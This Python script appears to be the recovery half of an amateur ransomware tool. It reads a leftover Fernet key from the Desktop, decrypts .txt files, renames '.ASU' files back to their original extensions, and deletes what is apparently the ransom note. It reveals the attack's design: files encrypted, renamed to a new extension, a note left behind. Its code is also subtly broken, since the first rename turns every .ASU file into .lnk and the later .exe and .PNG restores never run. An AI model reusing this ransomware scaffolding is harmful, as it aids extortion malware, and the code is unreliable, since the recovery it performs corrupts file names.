from cryptography.fernet import Fernet
import os
import platform
import shutil

#Change to desktop
home_directory = os.path.expanduser("~")
desktop = os.path.join(home_directory, "Desktop")
os.chdir(desktop)

# Read the key from the file
with open("JANGAN-HAPUS-INI.key", "rb") as f:
    key = f.read()

# Create a Fernet object with the key
fernet = Fernet(key)

# Function to decrypt and print the content of text files on the Desktop
def decrypt_files():
    try:
        for root, dirs, files in os.walk(os.getcwd()):
            for file_name in files:
                if file_name.endswith((".txt")) and file_name != "README.txt":
                    file_path = os.path.join(root, file_name)

                    with open(str(file_path), "rb") as f:
                        encrypted_data = f.read()

                    decrypted = fernet.decrypt(encrypted_data)

                    with open(str(file_path), "wb") as f:
                        f.write(decrypted)

                    print(f"Decrypted content of {file_name}")
    except FileNotFoundError:
        print("Error decrypting files. Desktop directory not found.")

# Change working directory to Desktop
# def change_to_desktop():
#     system = platform.system()

#     if system == "Windows":
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     elif system == "Darwin":  # macOS
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     elif system == "Linux":
#         # This assumes a standard GNOME desktop environment
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     else:
#         print("Unsupported operating system.")
#         return

#     try:
#         os.chdir(desktop_path)
#         print(f"Changed working directory to Desktop: {desktop_path}")
#     except FileNotFoundError:
#         print(f"Desktop directory not found: {desktop_path}")
        
def rollback_extension(directory, target_extension, rollback_extension):
    for filename in os.listdir(directory):
        if filename.endswith(target_extension):
            target_filepath = os.path.join(directory, filename)
            rollback_filepath = os.path.join(directory, filename.rsplit('.', 1)[0] + rollback_extension)
            os.rename(target_filepath, rollback_filepath)
            print(f"Changed {target_filepath} to {rollback_filepath}")

if __name__ == "__main__":
    # Change working directory to Desktop
    # change_to_desktop()
    target_directory = os.path.join(os.path.expanduser("~"), "Desktop")
    file_path = os.path.abspath("README.txt")

    # Rollback extension from .ASU to .lnk on the desktop
    rollback_extension(target_directory, ".ASU", ".lnk")

    # Rollback extension from .ASU to .exe on the desktop
    rollback_extension(target_directory, ".ASU", ".exe")

    # Rollback extension from .ASU to .jpg on the desktop
    # rollback_extension(target_directory, ".ASU", ".jpg")

    # Rollback extension from .ASU to .png on the desktop
    rollback_extension(target_directory, ".ASU", ".PNG")

    # Decrypt and print content of text files
    decrypt_files()

    # Remove file
    os.remove(file_path)
    os.remove("JANGAN-HAPUS-INI.key")